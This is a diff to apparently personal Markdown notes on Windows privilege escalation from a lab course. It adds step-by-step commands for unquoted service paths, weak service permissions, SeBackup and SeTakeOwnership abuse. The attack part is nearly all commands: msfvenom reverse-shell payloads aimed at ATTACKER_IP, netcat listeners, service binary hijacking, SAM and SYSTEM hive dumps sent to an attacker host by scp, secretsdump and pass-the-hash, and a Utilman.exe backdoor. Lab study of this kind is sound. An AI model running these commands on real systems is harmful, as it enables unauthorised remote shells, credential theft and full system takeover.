@@ -202,4 +202,66 @@ Usual files that may contain credentials:
   - move WService.exe WService.exe.bkp `move legitimate .exe to .bkp`
   - move C:\Users\thm-unpriv\rev-svc.exe WService.exe `move payload to legitmate location with same name`
   - icacls WService.exe /grant Everyone:F `grant permissions to the payload to everything`
+- *on attacker machine*
+  - nc -lnvp {PORT} `start listener`
+- *on target machine*
+  - sc stop windowsscheduler
+  - sc start windowsscheduler `restart service to get reverse shell`
   
+# Unquoted Service Paths
+- *CORRECT - "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service*
+- *WRONG - C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe*
+  - *Windows will run*
+  - "C:\\MyPrograms\\Disk.exe" first
+  - "C:\\MyPrograms\\Disk Sorter.exe" second
+  - "C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe" third
+- icacls {path} `to check ability to edit/add payload to the path`
+- *on attacker machine*
+  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+  - transfer to target machine
+- *on target machine*
+  - move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe 
+  - icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+  - sc stop "disk sorter enterprise"
+  - sc start "disk sorter enterprise"
+- "on attacker machine"
+  - nc -lnvp {PORT} `start listener`
+  
+# Insecure Service Permissions
+  - accesschk64.exe -qlc {service} `check service permissions`
+- *on attacker machine*
+  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+  - transfer to target machine
+  - start listener
+- *on target machine*
+  - icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F `grant permissions to your payload`
+  - sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem `change the service's associated executable and account` 
+  - sc stop THMservice
+  - sc start THMservice
+
+# SeBackup / SeRestore
+- *When a certain user has permissions to perform backups from a system without having full administrative privileges*
+  - whoami /priv `check our privileges`
+    - SeBackupPrivilege
+    - SeRestorePrivilege
+- *To backup the SAM and SYSTEM hashes, we can use the following commands:*
+  - reg save hklm\system {path to save to} `eg: reg save hklm\system C:\Users\THMBackup\system.hive`
+  - reg save hklm\sam {path to save to} `eg: reg save hklm\sam C:\Users\THMBackup\sam.hive`
+  - scp {system.hive} {attacker@attacker-ip}
+  - scp {sam.hive} {attacker@attacker-ip}
+- *on attacker target*
+  - impacket tools: https://github.com/SecureAuthCorp/impacket
+  - /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+  - /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP `Pass the hash attack`
+  
+# SeTakeOwnership
+- *SeTakeOwnership privilege allows a user to take ownership of any object on the system, can hijack objects*
+  - whoami /priv
+    - SeTakeOwnershipPrivilege
+  - Case study: Utilman.exe
+    - takeown /f C:\Windows\System32\Utilman.exe `taking ownership from `
+    - icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+    - C:\Windows\System32\> copy cmd.exe utilman.exe
+    - Start > Lock Screen > Ease of Access
+  
+# SeImpersonate / SeAssignPrimaryToken
